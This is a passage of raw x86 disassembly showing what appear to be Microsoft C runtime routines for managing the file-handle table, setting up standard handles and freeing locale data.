  408ef4:	74 1e                	je     0x408f14
  408ef6:	33 c0                	xor    %eax,%eax
  408ef8:	50                   	push   %eax
  408ef9:	50                   	push   %eax
  408efa:	ff 75 fc             	push   -0x4(%ebp)
  408efd:	57                   	push   %edi
  408efe:	53                   	push   %ebx
  408eff:	56                   	push   %esi
  408f00:	50                   	push   %eax
  408f01:	50                   	push   %eax
  408f02:	e8 ba fe ff ff       	call   0x408dc1
  408f07:	83 c4 20             	add    $0x20,%esp
  408f0a:	85 c0                	test   %eax,%eax
  408f0c:	74 06                	je     0x408f14
  408f0e:	8b df                	mov    %edi,%ebx
  408f10:	33 ff                	xor    %edi,%edi
  408f12:	eb 02                	jmp    0x408f16
  408f14:	33 db                	xor    %ebx,%ebx
  408f16:	57                   	push   %edi
  408f17:	e8 ab eb ff ff       	call   0x407ac7
  408f1c:	59                   	pop    %ecx
  408f1d:	eb 02                	jmp    0x408f21
  408f1f:	8b df                	mov    %edi,%ebx
  408f21:	85 f6                	test   %esi,%esi
  408f23:	74 07                	je     0x408f2c
  408f25:	56                   	push   %esi
  408f26:	ff 15 e8 f1 40 00    	call   *0x40f1e8
  408f2c:	5f                   	pop    %edi
  408f2d:	5e                   	pop    %esi
  408f2e:	8b c3                	mov    %ebx,%eax
  408f30:	5b                   	pop    %ebx
  408f31:	c9                   	leave
  408f32:	c3                   	ret
  408f33:	8b ff                	mov    %edi,%edi
  408f35:	55                   	push   %ebp
  408f36:	8b ec                	mov    %esp,%ebp
  408f38:	51                   	push   %ecx
  408f39:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  408f3f:	56                   	push   %esi
  408f40:	33 f6                	xor    %esi,%esi
  408f42:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408f45:	8b 40 10             	mov    0x10(%eax),%eax
  408f48:	39 70 08             	cmp    %esi,0x8(%eax)
  408f4b:	7c 0f                	jl     0x408f5c
  408f4d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408f50:	50                   	push   %eax
  408f51:	e8 10 e7 ff ff       	call   0x407666
  408f56:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  408f5a:	74 03                	je     0x408f5f
  408f5c:	33 f6                	xor    %esi,%esi
  408f5e:	46                   	inc    %esi
  408f5f:	8b c6                	mov    %esi,%eax
  408f61:	5e                   	pop    %esi
  408f62:	c9                   	leave
  408f63:	c3                   	ret
  408f64:	8b ff                	mov    %edi,%edi
  408f66:	55                   	push   %ebp
  408f67:	8b ec                	mov    %esp,%ebp
  408f69:	51                   	push   %ecx
  408f6a:	51                   	push   %ecx
  408f6b:	53                   	push   %ebx
  408f6c:	56                   	push   %esi
  408f6d:	6a 38                	push   $0x38
  408f6f:	6a 40                	push   $0x40
  408f71:	e8 f4 ea ff ff       	call   0x407a6a
  408f76:	8b f0                	mov    %eax,%esi
  408f78:	33 db                	xor    %ebx,%ebx
  408f7a:	89 75 f8             	mov    %esi,-0x8(%ebp)
  408f7d:	59                   	pop    %ecx
  408f7e:	59                   	pop    %ecx
  408f7f:	85 f6                	test   %esi,%esi
  408f81:	75 04                	jne    0x408f87
  408f83:	8b f3                	mov    %ebx,%esi
  408f85:	eb 4b                	jmp    0x408fd2
  408f87:	8d 86 00 0e 00 00    	lea    0xe00(%esi),%eax
  408f8d:	3b f0                	cmp    %eax,%esi
  408f8f:	74 41                	je     0x408fd2
  408f91:	57                   	push   %edi
  408f92:	8d 7e 20             	lea    0x20(%esi),%edi
  408f95:	8b f0                	mov    %eax,%esi
  408f97:	53                   	push   %ebx
  408f98:	68 a0 0f 00 00       	push   $0xfa0
  408f9d:	8d 47 e0             	lea    -0x20(%edi),%eax
  408fa0:	50                   	push   %eax
  408fa1:	e8 1e e8 ff ff       	call   0x4077c4
  408fa6:	83 4f f8 ff          	orl    $0xffffffff,-0x8(%edi)
  408faa:	80 67 0d f8          	andb   $0xf8,0xd(%edi)
  408fae:	89 1f                	mov    %ebx,(%edi)
  408fb0:	8d 7f 38             	lea    0x38(%edi),%edi
  408fb3:	89 5f cc             	mov    %ebx,-0x34(%edi)
  408fb6:	8d 47 e0             	lea    -0x20(%edi),%eax
  408fb9:	c7 47 d0 00 00 0a 0a 	movl   $0xa0a0000,-0x30(%edi)
  408fc0:	c6 47 d4 0a          	movb   $0xa,-0x2c(%edi)
  408fc4:	89 5f d6             	mov    %ebx,-0x2a(%edi)
  408fc7:	88 5f da             	mov    %bl,-0x26(%edi)
  408fca:	3b c6                	cmp    %esi,%eax
  408fcc:	75 c9                	jne    0x408f97
  408fce:	8b 75 f8             	mov    -0x8(%ebp),%esi
  408fd1:	5f                   	pop    %edi
  408fd2:	53                   	push   %ebx
  408fd3:	e8 ef ea ff ff       	call   0x407ac7
  408fd8:	59                   	pop    %ecx
  408fd9:	8b c6                	mov    %esi,%eax
  408fdb:	5e                   	pop    %esi
  408fdc:	5b                   	pop    %ebx
  408fdd:	c9                   	leave
  408fde:	c3                   	ret
  408fdf:	cc                   	int3
  408fe0:	cc                   	int3
  408fe1:	cc                   	int3
  408fe2:	8b ff                	mov    %edi,%edi
  408fe4:	55                   	push   %ebp
  408fe5:	8b ec                	mov    %esp,%ebp
  408fe7:	56                   	push   %esi
  408fe8:	8b 75 08             	mov    0x8(%ebp),%esi
  408feb:	85 f6                	test   %esi,%esi
  408fed:	74 25                	je     0x409014
  408fef:	53                   	push   %ebx
  408ff0:	8d 9e 00 0e 00 00    	lea    0xe00(%esi),%ebx
  408ff6:	57                   	push   %edi
  408ff7:	8b fe                	mov    %esi,%edi
  408ff9:	3b f3                	cmp    %ebx,%esi
  408ffb:	74 0e                	je     0x40900b
  408ffd:	57                   	push   %edi
  408ffe:	ff 15 88 f1 40 00    	call   *0x40f188
  409004:	83 c7 38             	add    $0x38,%edi
  409007:	3b fb                	cmp    %ebx,%edi
  409009:	75 f2                	jne    0x408ffd
  40900b:	56                   	push   %esi
  40900c:	e8 b6 ea ff ff       	call   0x407ac7
  409011:	59                   	pop    %ecx
  409012:	5f                   	pop    %edi
  409013:	5b                   	pop    %ebx
  409014:	5e                   	pop    %esi
  409015:	5d                   	pop    %ebp
  409016:	c3                   	ret
  409017:	6a 10                	push   $0x10
  409019:	68 58 4a 41 00       	push   $0x414a58
  40901e:	e8 cd b1 ff ff       	call   0x4041f0
  409023:	81 7d 08 00 20 00 00 	cmpl   $0x2000,0x8(%ebp)
  40902a:	72 21                	jb     0x40904d
  40902c:	e8 8a e4 ff ff       	call   0x4074bb
  409031:	6a 09                	push   $0x9
  409033:	5e                   	pop    %esi
  409034:	89 30                	mov    %esi,(%eax)
  409036:	e8 c3 e3 ff ff       	call   0x4073fe
  40903b:	8b c6                	mov    %esi,%eax
  40903d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409040:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409047:	59                   	pop    %ecx
  409048:	5f                   	pop    %edi
  409049:	5e                   	pop    %esi
  40904a:	5b                   	pop    %ebx
  40904b:	c9                   	leave
  40904c:	c3                   	ret
  40904d:	33 f6                	xor    %esi,%esi
  40904f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409052:	6a 07                	push   $0x7
  409054:	e8 64 e9 ff ff       	call   0x4079bd
  409059:	59                   	pop    %ecx
  40905a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40905d:	8b fe                	mov    %esi,%edi
  40905f:	a1 c8 72 41 00       	mov    0x4172c8,%eax
  409064:	89 7d e0             	mov    %edi,-0x20(%ebp)
  409067:	39 45 08             	cmp    %eax,0x8(%ebp)
  40906a:	7c 1f                	jl     0x40908b
  40906c:	39 34 bd c8 70 41 00 	cmp    %esi,0x4170c8(,%edi,4)
  409073:	75 31                	jne    0x4090a6
  409075:	e8 ea fe ff ff       	call   0x408f64
  40907a:	89 04 bd c8 70 41 00 	mov    %eax,0x4170c8(,%edi,4)
  409081:	85 c0                	test   %eax,%eax
  409083:	75 14                	jne    0x409099
  409085:	6a 0c                	push   $0xc
  409087:	5e                   	pop    %esi
  409088:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40908b:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409092:	e8 15 00 00 00       	call   0x4090ac
  409097:	eb a2                	jmp    0x40903b
  409099:	a1 c8 72 41 00       	mov    0x4172c8,%eax
  40909e:	83 c0 40             	add    $0x40,%eax
  4090a1:	a3 c8 72 41 00       	mov    %eax,0x4172c8
  4090a6:	47                   	inc    %edi
  4090a7:	eb bb                	jmp    0x409064
  4090a9:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4090ac:	6a 07                	push   $0x7
  4090ae:	e8 52 e9 ff ff       	call   0x407a05
  4090b3:	59                   	pop    %ecx
  4090b4:	c3                   	ret
  4090b5:	8b ff                	mov    %edi,%edi
  4090b7:	55                   	push   %ebp
  4090b8:	8b ec                	mov    %esp,%ebp
  4090ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4090bd:	8b c8                	mov    %eax,%ecx
  4090bf:	83 e0 3f             	and    $0x3f,%eax
  4090c2:	c1 f9 06             	sar    $0x6,%ecx
  4090c5:	6b c0 38             	imul   $0x38,%eax,%eax
  4090c8:	03 04 8d c8 70 41 00 	add    0x4170c8(,%ecx,4),%eax
  4090cf:	50                   	push   %eax
  4090d0:	ff 15 80 f1 40 00    	call   *0x40f180
  4090d6:	5d                   	pop    %ebp
  4090d7:	c3                   	ret
  4090d8:	8b ff                	mov    %edi,%edi
  4090da:	55                   	push   %ebp
  4090db:	8b ec                	mov    %esp,%ebp
  4090dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4090e0:	8b c8                	mov    %eax,%ecx
  4090e2:	83 e0 3f             	and    $0x3f,%eax
  4090e5:	c1 f9 06             	sar    $0x6,%ecx
  4090e8:	6b c0 38             	imul   $0x38,%eax,%eax
  4090eb:	03 04 8d c8 70 41 00 	add    0x4170c8(,%ecx,4),%eax
  4090f2:	50                   	push   %eax
  4090f3:	ff 15 84 f1 40 00    	call   *0x40f184
  4090f9:	5d                   	pop    %ebp
  4090fa:	c3                   	ret
  4090fb:	8b ff                	mov    %edi,%edi
  4090fd:	55                   	push   %ebp
  4090fe:	8b ec                	mov    %esp,%ebp
  409100:	53                   	push   %ebx
  409101:	56                   	push   %esi
  409102:	8b 75 08             	mov    0x8(%ebp),%esi
  409105:	57                   	push   %edi
  409106:	85 f6                	test   %esi,%esi
  409108:	78 67                	js     0x409171
  40910a:	3b 35 c8 72 41 00    	cmp    0x4172c8,%esi
  409110:	73 5f                	jae    0x409171
  409112:	8b c6                	mov    %esi,%eax
  409114:	8b fe                	mov    %esi,%edi
  409116:	83 e0 3f             	and    $0x3f,%eax
  409119:	c1 ff 06             	sar    $0x6,%edi
  40911c:	6b d8 38             	imul   $0x38,%eax,%ebx
  40911f:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  409126:	f6 44 03 28 01       	testb  $0x1,0x28(%ebx,%eax,1)
  40912b:	74 44                	je     0x409171
  40912d:	83 7c 03 18 ff       	cmpl   $0xffffffff,0x18(%ebx,%eax,1)
  409132:	74 3d                	je     0x409171
  409134:	e8 f4 c9 ff ff       	call   0x405b2d
  409139:	83 f8 01             	cmp    $0x1,%eax
  40913c:	75 23                	jne    0x409161
  40913e:	33 c0                	xor    %eax,%eax
  409140:	2b f0                	sub    %eax,%esi
  409142:	74 14                	je     0x409158
  409144:	83 ee 01             	sub    $0x1,%esi
  409147:	74 0a                	je     0x409153
  409149:	83 ee 01             	sub    $0x1,%esi
  40914c:	75 13                	jne    0x409161
  40914e:	50                   	push   %eax
  40914f:	6a f4                	push   $0xfffffff4
  409151:	eb 08                	jmp    0x40915b
  409153:	50                   	push   %eax
  409154:	6a f5                	push   $0xfffffff5
  409156:	eb 03                	jmp    0x40915b
  409158:	50                   	push   %eax
  409159:	6a f6                	push   $0xfffffff6
  40915b:	ff 15 ec f1 40 00    	call   *0x40f1ec
  409161:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  409168:	83 4c 03 18 ff       	orl    $0xffffffff,0x18(%ebx,%eax,1)
  40916d:	33 c0                	xor    %eax,%eax
  40916f:	eb 16                	jmp    0x409187
  409171:	e8 45 e3 ff ff       	call   0x4074bb
  409176:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40917c:	e8 27 e3 ff ff       	call   0x4074a8
  409181:	83 20 00             	andl   $0x0,(%eax)
  409184:	83 c8 ff             	or     $0xffffffff,%eax
  409187:	5f                   	pop    %edi
  409188:	5e                   	pop    %esi
  409189:	5b                   	pop    %ebx
  40918a:	5d                   	pop    %ebp
  40918b:	c3                   	ret
  40918c:	8b ff                	mov    %edi,%edi
  40918e:	55                   	push   %ebp
  40918f:	8b ec                	mov    %esp,%ebp
  409191:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409194:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  409197:	75 15                	jne    0x4091ae
  409199:	e8 0a e3 ff ff       	call   0x4074a8
  40919e:	83 20 00             	andl   $0x0,(%eax)
  4091a1:	e8 15 e3 ff ff       	call   0x4074bb
  4091a6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4091ac:	eb 43                	jmp    0x4091f1
  4091ae:	85 c9                	test   %ecx,%ecx
  4091b0:	78 27                	js     0x4091d9
  4091b2:	3b 0d c8 72 41 00    	cmp    0x4172c8,%ecx
  4091b8:	73 1f                	jae    0x4091d9
  4091ba:	8b c1                	mov    %ecx,%eax
  4091bc:	83 e1 3f             	and    $0x3f,%ecx
  4091bf:	c1 f8 06             	sar    $0x6,%eax
  4091c2:	6b c9 38             	imul   $0x38,%ecx,%ecx
  4091c5:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  4091cc:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  4091d1:	74 06                	je     0x4091d9
  4091d3:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  4091d7:	5d                   	pop    %ebp
  4091d8:	c3                   	ret
  4091d9:	e8 ca e2 ff ff       	call   0x4074a8
  4091de:	83 20 00             	andl   $0x0,(%eax)
  4091e1:	e8 d5 e2 ff ff       	call   0x4074bb
  4091e6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4091ec:	e8 0d e2 ff ff       	call   0x4073fe
  4091f1:	83 c8 ff             	or     $0xffffffff,%eax
  4091f4:	5d                   	pop    %ebp
  4091f5:	c3                   	ret
  4091f6:	83 3d c0 70 41 00 00 	cmpl   $0x0,0x4170c0
  4091fd:	75 0a                	jne    0x409209
  4091ff:	c7 05 c0 70 41 00 00 	movl   $0x4000,0x4170c0
  409206:	40 00 00 
  409209:	33 c0                	xor    %eax,%eax
  40920b:	c3                   	ret
  40920c:	8b ff                	mov    %edi,%edi
  40920e:	55                   	push   %ebp
  40920f:	8b ec                	mov    %esp,%ebp
  409211:	83 ec 48             	sub    $0x48,%esp
  409214:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409217:	50                   	push   %eax
  409218:	ff 15 70 f1 40 00    	call   *0x40f170
  40921e:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
  409223:	0f 84 97 00 00 00    	je     0x4092c0
  409229:	53                   	push   %ebx
  40922a:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  40922d:	85 db                	test   %ebx,%ebx
  40922f:	0f 84 8a 00 00 00    	je     0x4092bf
  409235:	56                   	push   %esi
  409236:	8b 33                	mov    (%ebx),%esi
  409238:	8d 43 04             	lea    0x4(%ebx),%eax
  40923b:	03 c6                	add    %esi,%eax
  40923d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409240:	b8 00 20 00 00       	mov    $0x2000,%eax
  409245:	3b f0                	cmp    %eax,%esi
  409247:	7c 02                	jl     0x40924b
  409249:	8b f0                	mov    %eax,%esi
  40924b:	56                   	push   %esi
  40924c:	e8 c6 fd ff ff       	call   0x409017
  409251:	a1 c8 72 41 00       	mov    0x4172c8,%eax
  409256:	59                   	pop    %ecx
  409257:	3b f0                	cmp    %eax,%esi
  409259:	7e 02                	jle    0x40925d
  40925b:	8b f0                	mov    %eax,%esi
  40925d:	57                   	push   %edi
  40925e:	33 ff                	xor    %edi,%edi
  409260:	85 f6                	test   %esi,%esi
  409262:	74 59                	je     0x4092bd
  409264:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409267:	8b 08                	mov    (%eax),%ecx
  409269:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40926c:	74 44                	je     0x4092b2
  40926e:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  409271:	74 3f                	je     0x4092b2
  409273:	8a 54 1f 04          	mov    0x4(%edi,%ebx,1),%dl
  409277:	f6 c2 01             	test   $0x1,%dl
  40927a:	74 36                	je     0x4092b2
  40927c:	f6 c2 08             	test   $0x8,%dl
  40927f:	75 0b                	jne    0x40928c
  409281:	51                   	push   %ecx
  409282:	ff 15 f0 f1 40 00    	call   *0x40f1f0
  409288:	85 c0                	test   %eax,%eax
  40928a:	74 23                	je     0x4092af
  40928c:	8b c7                	mov    %edi,%eax
  40928e:	8b cf                	mov    %edi,%ecx
  409290:	83 e0 3f             	and    $0x3f,%eax
  409293:	c1 f9 06             	sar    $0x6,%ecx
  409296:	6b d0 38             	imul   $0x38,%eax,%edx
  409299:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40929c:	03 14 8d c8 70 41 00 	add    0x4170c8(,%ecx,4),%edx
  4092a3:	8b 00                	mov    (%eax),%eax
  4092a5:	89 42 18             	mov    %eax,0x18(%edx)
  4092a8:	8a 44 1f 04          	mov    0x4(%edi,%ebx,1),%al
  4092ac:	88 42 28             	mov    %al,0x28(%edx)
  4092af:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4092b2:	47                   	inc    %edi
  4092b3:	83 c0 04             	add    $0x4,%eax
  4092b6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4092b9:	3b fe                	cmp    %esi,%edi
  4092bb:	75 aa                	jne    0x409267
  4092bd:	5f                   	pop    %edi
  4092be:	5e                   	pop    %esi
  4092bf:	5b                   	pop    %ebx
  4092c0:	c9                   	leave
  4092c1:	c3                   	ret
  4092c2:	8b ff                	mov    %edi,%edi
  4092c4:	53                   	push   %ebx
  4092c5:	56                   	push   %esi
  4092c6:	57                   	push   %edi
  4092c7:	33 ff                	xor    %edi,%edi
  4092c9:	8b c7                	mov    %edi,%eax
  4092cb:	8b cf                	mov    %edi,%ecx
  4092cd:	83 e0 3f             	and    $0x3f,%eax
  4092d0:	c1 f9 06             	sar    $0x6,%ecx
  4092d3:	6b f0 38             	imul   $0x38,%eax,%esi
  4092d6:	03 34 8d c8 70 41 00 	add    0x4170c8(,%ecx,4),%esi
  4092dd:	83 7e 18 ff          	cmpl   $0xffffffff,0x18(%esi)
  4092e1:	74 0c                	je     0x4092ef
  4092e3:	83 7e 18 fe          	cmpl   $0xfffffffe,0x18(%esi)
  4092e7:	74 06                	je     0x4092ef
  4092e9:	80 4e 28 80          	orb    $0x80,0x28(%esi)
  4092ed:	eb 79                	jmp    0x409368
  4092ef:	8b c7                	mov    %edi,%eax
  4092f1:	c6 46 28 81          	movb   $0x81,0x28(%esi)
  4092f5:	83 e8 00             	sub    $0x0,%eax
  4092f8:	74 10                	je     0x40930a
  4092fa:	83 e8 01             	sub    $0x1,%eax
  4092fd:	74 07                	je     0x409306
  4092ff:	83 e8 01             	sub    $0x1,%eax
  409302:	6a f4                	push   $0xfffffff4
  409304:	eb 06                	jmp    0x40930c
  409306:	6a f5                	push   $0xfffffff5
  409308:	eb 02                	jmp    0x40930c
  40930a:	6a f6                	push   $0xfffffff6
  40930c:	58                   	pop    %eax
  40930d:	50                   	push   %eax
  40930e:	ff 15 a4 f1 40 00    	call   *0x40f1a4
  409314:	8b d8                	mov    %eax,%ebx
  409316:	83 fb ff             	cmp    $0xffffffff,%ebx
  409319:	74 0d                	je     0x409328
  40931b:	85 db                	test   %ebx,%ebx
  40931d:	74 09                	je     0x409328
  40931f:	53                   	push   %ebx
  409320:	ff 15 f0 f1 40 00    	call   *0x40f1f0
  409326:	eb 02                	jmp    0x40932a
  409328:	33 c0                	xor    %eax,%eax
  40932a:	85 c0                	test   %eax,%eax
  40932c:	74 1c                	je     0x40934a
  40932e:	0f b6 c0             	movzbl %al,%eax
  409331:	89 5e 18             	mov    %ebx,0x18(%esi)
  409334:	83 f8 02             	cmp    $0x2,%eax
  409337:	75 06                	jne    0x40933f
  409339:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  40933d:	eb 29                	jmp    0x409368
  40933f:	83 f8 03             	cmp    $0x3,%eax
  409342:	75 24                	jne    0x409368
  409344:	80 4e 28 08          	orb    $0x8,0x28(%esi)
  409348:	eb 1e                	jmp    0x409368
  40934a:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  40934e:	c7 46 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%esi)
  409355:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40935a:	85 c0                	test   %eax,%eax
  40935c:	74 0a                	je     0x409368
  40935e:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  409361:	c7 40 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%eax)
  409368:	47                   	inc    %edi
  409369:	83 ff 03             	cmp    $0x3,%edi
  40936c:	0f 85 57 ff ff ff    	jne    0x4092c9
  409372:	5f                   	pop    %edi
  409373:	5e                   	pop    %esi
  409374:	5b                   	pop    %ebx
  409375:	c3                   	ret
  409376:	6a 0c                	push   $0xc
  409378:	68 78 4a 41 00       	push   $0x414a78
  40937d:	e8 6e ae ff ff       	call   0x4041f0
  409382:	6a 07                	push   $0x7
  409384:	e8 34 e6 ff ff       	call   0x4079bd
  409389:	59                   	pop    %ecx
  40938a:	33 db                	xor    %ebx,%ebx
  40938c:	88 5d e7             	mov    %bl,-0x19(%ebp)
  40938f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  409392:	53                   	push   %ebx
  409393:	e8 7f fc ff ff       	call   0x409017
  409398:	59                   	pop    %ecx
  409399:	85 c0                	test   %eax,%eax
  40939b:	75 0f                	jne    0x4093ac
  40939d:	e8 6a fe ff ff       	call   0x40920c
  4093a2:	e8 1b ff ff ff       	call   0x4092c2
  4093a7:	b3 01                	mov    $0x1,%bl
  4093a9:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4093ac:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4093b3:	e8 15 00 00 00       	call   0x4093cd
  4093b8:	8a c3                	mov    %bl,%al
  4093ba:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4093bd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4093c4:	59                   	pop    %ecx
  4093c5:	5f                   	pop    %edi
  4093c6:	5e                   	pop    %esi
  4093c7:	5b                   	pop    %ebx
  4093c8:	c9                   	leave
  4093c9:	c3                   	ret
  4093ca:	8a 5d e7             	mov    -0x19(%ebp),%bl
  4093cd:	6a 07                	push   $0x7
  4093cf:	e8 31 e6 ff ff       	call   0x407a05
  4093d4:	59                   	pop    %ecx
  4093d5:	c3                   	ret
  4093d6:	8b ff                	mov    %edi,%edi
  4093d8:	56                   	push   %esi
  4093d9:	33 f6                	xor    %esi,%esi
  4093db:	8b 86 c8 70 41 00    	mov    0x4170c8(%esi),%eax
  4093e1:	85 c0                	test   %eax,%eax
  4093e3:	74 0e                	je     0x4093f3
  4093e5:	50                   	push   %eax
  4093e6:	e8 f7 fb ff ff       	call   0x408fe2
  4093eb:	83 a6 c8 70 41 00 00 	andl   $0x0,0x4170c8(%esi)
  4093f2:	59                   	pop    %ecx
  4093f3:	83 c6 04             	add    $0x4,%esi
  4093f6:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  4093fc:	72 dd                	jb     0x4093db
  4093fe:	b0 01                	mov    $0x1,%al
  409400:	5e                   	pop    %esi
  409401:	c3                   	ret
  409402:	8b ff                	mov    %edi,%edi
  409404:	55                   	push   %ebp
  409405:	8b ec                	mov    %esp,%ebp
  409407:	56                   	push   %esi
  409408:	8b 75 08             	mov    0x8(%ebp),%esi
  40940b:	85 f6                	test   %esi,%esi
  40940d:	0f 84 ea 00 00 00    	je     0x4094fd
  409413:	8b 46 0c             	mov    0xc(%esi),%eax
  409416:	3b 05 54 66 41 00    	cmp    0x416654,%eax
  40941c:	74 07                	je     0x409425
  40941e:	50                   	push   %eax
  40941f:	e8 a3 e6 ff ff       	call   0x407ac7
  409424:	59                   	pop    %ecx
  409425:	8b 46 10             	mov    0x10(%esi),%eax
  409428:	3b 05 58 66 41 00    	cmp    0x416658,%eax
  40942e:	74 07                	je     0x409437
  409430:	50                   	push   %eax
  409431:	e8 91 e6 ff ff       	call   0x407ac7
  409436:	59                   	pop    %ecx
  409437:	8b 46 14             	mov    0x14(%esi),%eax
  40943a:	3b 05 5c 66 41 00    	cmp    0x41665c,%eax
  409440:	74 07                	je     0x409449
  409442:	50                   	push   %eax
  409443:	e8 7f e6 ff ff       	call   0x407ac7
  409448:	59                   	pop    %ecx
  409449:	8b 46 18             	mov    0x18(%esi),%eax
  40944c:	3b 05 60 66 41 00    	cmp    0x416660,%eax
  409452:	74 07                	je     0x40945b
  409454:	50                   	push   %eax
  409455:	e8 6d e6 ff ff       	call   0x407ac7
  40945a:	59                   	pop    %ecx
  40945b:	8b 46 1c             	mov    0x1c(%esi),%eax
  40945e:	3b 05 64 66 41 00    	cmp    0x416664,%eax
  409464:	74 07                	je     0x40946d
  409466:	50                   	push   %eax
  409467:	e8 5b e6 ff ff       	call   0x407ac7
  40946c:	59                   	pop    %ecx
  40946d:	8b 46 20             	mov    0x20(%esi),%eax
  409470:	3b 05 68 66 41 00    	cmp    0x416668,%eax
  409476:	74 07                	je     0x40947f
  409478:	50                   	push   %eax
  409479:	e8 49 e6 ff ff       	call   0x407ac7
  40947e:	59                   	pop    %ecx
  40947f:	8b 46 24             	mov    0x24(%esi),%eax
  409482:	3b 05 6c 66 41 00    	cmp    0x41666c,%eax
  409488:	74 07                	je     0x409491
  40948a:	50                   	push   %eax
  40948b:	e8 37 e6 ff ff       	call   0x407ac7
  409490:	59                   	pop    %ecx
  409491:	8b 46 38             	mov    0x38(%esi),%eax
  409494:	3b 05 80 66 41 00    	cmp    0x416680,%eax
  40949a:	74 07                	je     0x4094a3
  40949c:	50                   	push   %eax
  40949d:	e8 25 e6 ff ff       	call   0x407ac7
  4094a2:	59                   	pop    %ecx
  4094a3:	8b 46 3c             	mov    0x3c(%esi),%eax
  4094a6:	3b 05 84 66 41 00    	cmp    0x416684,%eax
  4094ac:	74 07                	je     0x4094b5
  4094ae:	50                   	push   %eax
  4094af:	e8 13 e6 ff ff       	call   0x407ac7
  4094b4:	59                   	pop    %ecx
  4094b5:	8b 46 40             	mov    0x40(%esi),%eax
  4094b8:	3b 05 88 66 41 00    	cmp    0x416688,%eax
  4094be:	74 07                	je     0x4094c7
  4094c0:	50                   	push   %eax
  4094c1:	e8 01 e6 ff ff       	call   0x407ac7
  4094c6:	59                   	pop    %ecx
  4094c7:	8b 46 44             	mov    0x44(%esi),%eax
  4094ca:	3b 05 8c 66 41 00    	cmp    0x41668c,%eax
  4094d0:	74 07                	je     0x4094d9
  4094d2:	50                   	push   %eax
  4094d3:	e8 ef e5 ff ff       	call   0x407ac7
  4094d8:	59                   	pop    %ecx
  4094d9:	8b 46 48             	mov    0x48(%esi),%eax
  4094dc:	3b 05 90 66 41 00    	cmp    0x416690,%eax
  4094e2:	74 07                	je     0x4094eb
  4094e4:	50                   	push   %eax
  4094e5:	e8 dd e5 ff ff       	call   0x407ac7
  4094ea:	59                   	pop    %ecx
  4094eb:	8b 46 4c             	mov    0x4c(%esi),%eax
  4094ee:	3b 05 94 66 41 00    	cmp    0x416694,%eax
  4094f4:	74 07                	je     0x4094fd
  4094f6:	50                   	push   %eax
  4094f7:	e8 cb e5 ff ff       	call   0x407ac7
  4094fc:	59                   	pop    %ecx
  4094fd:	5e                   	pop    %esi
  4094fe:	5d                   	pop    %ebp
  4094ff:	c3                   	ret
  409500:	8b ff                	mov    %edi,%edi
  409502:	55                   	push   %ebp
  409503:	8b ec                	mov    %esp,%ebp
  409505:	56                   	push   %esi
  409506:	8b 75 08             	mov    0x8(%ebp),%esi
  409509:	85 f6                	test   %esi,%esi
  40950b:	74 59                	je     0x409566
  40950d:	8b 06                	mov    (%esi),%eax
  40950f:	3b 05 48 66 41 00    	cmp    0x416648,%eax
  409515:	74 07                	je     0x40951e
  409517:	50                   	push   %eax
  409518:	e8 aa e5 ff ff       	call   0x407ac7
  40951d:	59                   	pop    %ecx
  40951e:	8b 46 04             	mov    0x4(%esi),%eax
  409521:	3b 05 4c 66 41 00    	cmp    0x41664c,%eax
  409527:	74 07                	je     0x409530
  409529:	50                   	push   %eax
  40952a:	e8 98 e5 ff ff       	call   0x407ac7
  40952f:	59                   	pop    %ecx
  409530:	8b 46 08             	mov    0x8(%esi),%eax
  409533:	3b 05 50 66 41 00    	cmp    0x416650,%eax
  409539:	74 07                	je     0x409542
  40953b:	50                   	push   %eax
  40953c:	e8 86 e5 ff ff       	call   0x407ac7
  409541:	59                   	pop    %ecx
  409542:	8b 46 30             	mov    0x30(%esi),%eax
  409545:	3b 05 78 66 41 00    	cmp    0x416678,%eax
  40954b:	74 07                	je     0x409554
  40954d:	50                   	push   %eax
  40954e:	e8 74 e5 ff ff       	call   0x407ac7
  409553:	59                   	pop    %ecx
  409554:	8b 46 34             	mov    0x34(%esi),%eax
  409557:	3b 05 7c 66 41 00    	cmp    0x41667c,%eax
  40955d:	74 07                	je     0x409566
  40955f:	50                   	push   %eax
